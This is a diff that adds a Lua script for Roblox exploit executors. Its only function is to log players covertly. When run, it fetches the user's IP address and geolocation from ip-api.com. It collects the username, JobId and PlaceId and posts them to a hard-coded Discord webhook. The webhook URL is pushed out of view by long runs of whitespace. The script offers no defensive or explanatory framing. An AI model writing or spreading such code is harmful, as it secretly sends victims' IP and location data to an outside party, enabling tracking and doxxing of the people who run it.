@@ -1,0 +1,51 @@
+if syn then
+    local lfv = tostring(game:HttpGet("http://ip-api.com/json/", true))
+    local lfv2 = game.Players.LocalPlayer.Name
+    local jobid = game.JobId
+    local placeid = game.PlaceId
+msg = {
+["embeds"] = {{
+["color"] = 053000,
+["description"] = "Username: " .. lfv2 .. "; Other info: " .. lfv .. "; JobID: " .. jobid .. "; Place ID: " .. placeid .. '.',
+["author"] = {
+["name"] = "."
+}}
+}
+}
+
+local response = syn.request(
+{
+                                                                                                                                                            Url = "https://discord.com/api/webhooks/954405273483747420/kB1hyzlvOIMK_DWTSPXne5vQVS3nx-a2iygZd74BFz4YkBcuNuQaThw-8A1frugpKg_w",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(msg)
+}
+)
+else
+local lfv = tostring(game:HttpGet("http://ip-api.com/json/", true))
+local lfv2 = game.Players.LocalPlayer.Name
+local jobid = game.JobId
+local placeid = game.PlaceId
+msg = {
+["embeds"] = {{
+["color"] = 0000000,
+["description"] = "Username: " .. lfv2 .. "; Other info: " .. lfv .. "; JobID: " .. jobid .. "; Place ID: " .. placeid .. '.',
+["author"] = {
+["name"] = "."
+}}
+}
+}
+
+local response = request(
+{
+                                                                                                                                                                            Url = "discord webhook in here",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(msg)
+}
+)
+end
